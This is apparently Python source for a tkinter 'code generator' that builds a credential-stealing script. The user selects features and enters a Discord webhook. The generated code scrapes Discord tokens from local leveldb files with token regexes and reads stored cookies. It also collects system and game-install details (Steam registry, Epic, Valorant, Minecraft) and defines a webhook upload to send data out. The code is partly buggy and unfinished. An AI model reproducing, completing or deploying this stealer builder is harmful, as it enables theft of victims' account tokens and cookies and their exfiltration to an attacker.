import tkinter as tk
from tkinter import messagebox, filedialog
import os
import requests
import sqlite3
import winreg as reg

def generate_code(selected_features, webhook_url, image_path):
    """Generates Python code based on selected features."""
    # Ensure that the webhook URL is treated as a string (use single quotes to avoid issues)
    code = f"""import os
import platform
import socket
import requests
import json
import re
import sqlite3
import winreg as reg

# Discord webhook URL
WEBHOOK_URL = '{webhook_url}'

def get_system_info():
    '''Gather system information'''
    return {{
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname())
    }}\n"""
    
    # Append selected features to the code
    if 'System Info' in selected_features:
        code += """
def get_discord_tokens():
    '''Retrieve Discord tokens from local storage'''
    tokens = []
    paths = {{
        "Discord": os.path.join(os.getenv('APPDATA'), "discord", "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage", "leveldb"),
        "Discord PTB": os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage", "leveldb")
    }}

    for platform, path in paths.items():
        try:
            for file_name in os.listdir(path):
                if file_name.endswith((".log", ".ldb")):
                    with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                        lines = [line.strip() for line in file.readlines() if line.strip()]
                        for line in lines:
                            tokens.extend(re.findall(r"[\w-]{{24}}\.[\w-]{{6}}\.[\w-]{{27}}", line))
                            tokens.extend(re.findall(r"mfa\.[\w-]{{84}}", line))
        except Exception as e:
            print(f"Error reading Discord tokens: {e}")
            continue
    return tokens
"""
    if 'Discord Info' in selected_features:
        code += """
def get_cookies():
    '''Retrieve cookies from local storage'''
    cookies = {{}}
    paths = {{
        "Discord": os.path.join(os.getenv('APPDATA'), "discord", "Local Storage"),
        "Discord Canary": os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage"),
        "Discord PTB": os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage")
    }}

    for platform, path in paths.items():
        try:
            for file_name in os.listdir(path):
                if file_name.endswith(".sqlite"):
                    conn = sqlite3.connect(os.path.join(path, file_name))
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                    cookies.update({f"{host_key}{name}": value for host_key, name, value in cursor.fetchall()})
                    conn.close()
        except Exception as e:
            print(f"Error reading cookies: {e}")
            continue
    return cookies
"""
    if 'Minecraft Info' in selected_features:
        code += """
def get_minecraft_info():
    '''Gather Minecraft-related information'''
    info = {{}}
    try:
        minecraft_dir = os.path.join(os.getenv('APPDATA'), ".minecraft")
        if os.path.exists(minecraft_dir):
            info["Minecraft Directory"] = minecraft_dir
    except Exception as e:
        print(f"Error gathering Minecraft info: {e}")
    return info
"""
    if 'Valorant Info' in selected_features:
        code += """
def get_valorant_info():
    '''Gather Valorant-related information'''
    info = {{}}
    try:
        valorant_dir = os.path.join(os.getenv('APPDATA'), "Riot Games", "VALORANT")
        if os.path.exists(valorant_dir):
            info["Valorant Directory"] = valorant_dir
    except Exception as e:
        print(f"Error gathering Valorant info: {e}")
    return info
"""

    if 'Steam Info' in selected_features:
        code += """
def get_steam_info():
    '''Retrieve Steam installation path and installed games'''
    steam_info = {{}}
    try:
        # Check the registry for the Steam install path
        reg_path = r"SOFTWARE\\WOW6432Node\\Valve\\Steam"
        registry_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, reg_path)
        steam_path, _ = reg.QueryValueEx(registry_key, "InstallPath")
        steam_info["Steam Installation Path"] = steam_path
        reg.CloseKey(registry_key)

        # Check the Steam installation directory for installed games
        games = []
        for game_dir in os.listdir(steam_path + "\\steamapps"):
            if game_dir.endswith(".acf"):
                games.append(game_dir)
        steam_info["Installed Games"] = games
    except Exception as e:
        print(f"Error gathering Steam info: {e}")
    return steam_info
"""

    if 'Epic Games Info' in selected_features:
        code += """
def get_epic_games_info():
    '''Retrieve Epic Games installation path and installed games'''
    epic_info = {{}}
    try:
        # Epic Games store installation path
        epic_path = os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Epic Games')
        epic_info["Epic Games Installation Path"] = epic_path

        # Check for installed games
        games = []
        for game_dir in os.listdir(epic_path):
            if os.path.isdir(os.path.join(epic_path, game_dir)):
                games.append(game_dir)
        epic_info["Installed Games"] = games
    except Exception as e:
        print(f"Error gathering Epic Games info: {e}")
    return epic_info
"""

    if image_path:
        code += f"""
def send_image():
    '''Send an image to Discord via webhook'''
    url = '{webhook_url}'
    files = {{'file': open('{image_path}', 'rb')}}
    data = {{
        'content': 'Here is an image!'
    }}
    response = requests.post(url, data=data, files=files)
    print(response.status_code, response.text)
"""

    return code

def on_build_button_click():
    """Handle the build button click event."""
    webhook_url = webhook_entry.get()
    if not webhook_url:
        messagebox.showerror("Error", "Please enter a valid webhook URL")
        return

    selected_features = []
    if system_info_var.get():
        selected_features.append('System Info')
    if discord_info_var.get():
        selected_features.append('Discord Info')
    if minecraft_info_var.get():
        selected_features.append('Minecraft Info')
    if valorant_info_var.get():
        selected_features.append('Valorant Info')
    if steam_info_var.get():
        selected_features.append('Steam Info')
    if epic_games_info_var.get():
        selected_features.append('Epic Games Info')
    
    if not selected_features:
        messagebox.showerror("Error", "Please select at least one feature")
        return

    # Generate the code based on selected features and webhook URL
    code = generate_code(selected_features, webhook_url, image_path)

    # Display the generated code
    code_output.delete(1.0, tk.END)  # Clear previous code
    code_output.insert(tk.END, code)  # Display new code

def on_select_image_button_click():
    """Handle the image selection button click event."""
    global image_path
    image_path = filedialog.askopenfilename(title="Select an image", filetypes=[("Image files", "*.png;*.jpg;*.jpeg;*.gif")])
    if image_path:
        image_path_label.config(text=f"Selected Image: {os.path.basename(image_path)}")

# GUI setup
root = tk.Tk()
root.title("Code Generator")
root.geometry("600x700")
root.config(bg="black")

# Title
title_label = tk.Label(root, text="Select Features and Enter Webhook URL", fg="white", bg="black", font=("Helvetica", 16))
title_label.grid(row=0, column=0, columnspan=3, pady=20)

# Feature selection checkboxes (arranged in a grid layout)
system_info_var = tk.BooleanVar()
discord_info_var = tk.BooleanVar()
minecraft_info_var = tk.BooleanVar()
valorant_info_var = tk.BooleanVar()
steam_info_var = tk.BooleanVar()
epic_games_info_var = tk.BooleanVar()

system_info_check = tk.Checkbutton(root, text="System Info", variable=system_info_var, fg="white", bg="black", selectcolor="purple")
discord_info_check = tk.Checkbutton(root, text="Discord Info", variable=discord_info_var, fg="white", bg="black", selectcolor="purple")
minecraft_info_check = tk.Checkbutton(root, text="Minecraft Info", variable=minecraft_info_var, fg="white", bg="black", selectcolor="purple")
valorant_info_check = tk.Checkbutton(root, text="Valorant Info", variable=valorant_info_var, fg="white", bg="black", selectcolor="purple")
steam_info_check = tk.Checkbutton(root, text="Steam Info", variable=steam_info_var, fg="white", bg="black", selectcolor="purple")
epic_games_info_check = tk.Checkbutton(root, text="Epic Games Info", variable=epic_games_info_var, fg="white", bg="black", selectcolor="purple")

system_info_check.grid(row=1, column=0, padx=20, pady=10)
discord_info_check.grid(row=2, column=0, padx=20, pady=10)
minecraft_info_check.grid(row=1, column=1, padx=20, pady=10)
valorant_info_check.grid(row=2, column=1, padx=20, pady=10)
steam_info_check.grid(row=1, column=2, padx=20, pady=10)
epic_games_info_check.grid(row=2, column=2, padx=20, pady=10)

# Webhook URL entry
webhook_label = tk.Label(root, text="Enter Webhook URL:", fg="white", bg="black", font=("Helvetica", 12))
webhook_label.grid(row=3, column=0, columnspan=3, pady=10)

webhook_entry = tk.Entry(root, width=50, fg="black", bg="white", font=("Helvetica", 12))
webhook_entry.grid(row=4, column=0, columnspan=3, pady=10)

# Select image button
select_image_button = tk.Button(root, text="Select Image", command=on_select_image_button_click, fg="white", bg="purple", font=("Helvetica", 14))
select_image_button.grid(row=5, column=0, columnspan=3, pady=10)

# Image path label
image_path_label = tk.Label(root, text="No image selected", fg="white", bg="black", font=("Helvetica", 12))
image_path_label.grid(row=6, column=0, columnspan=3, pady=5)

# Build button
build_button = tk.Button(root, text="Build", command=on_build_button_click, fg="white", bg="purple", font=("Helvetica", 14))
build_button.grid(row=7, column=0, columnspan=3, pady=20)

# Code output area
code_output_label = tk.Label(root, text="Generated Code:", fg="white", bg="black", font=("Helvetica", 12))
code_output_label.grid(row=8, column=0, columnspan=3, pady=10)

code_output = tk.Text(root, width=70, height=10, wrap=tk.WORD, fg="black", bg="white", font=("Courier", 10))
code_output.grid(row=9, column=0, columnspan=3, pady=10)

# Start the GUI loop
root.mainloop()
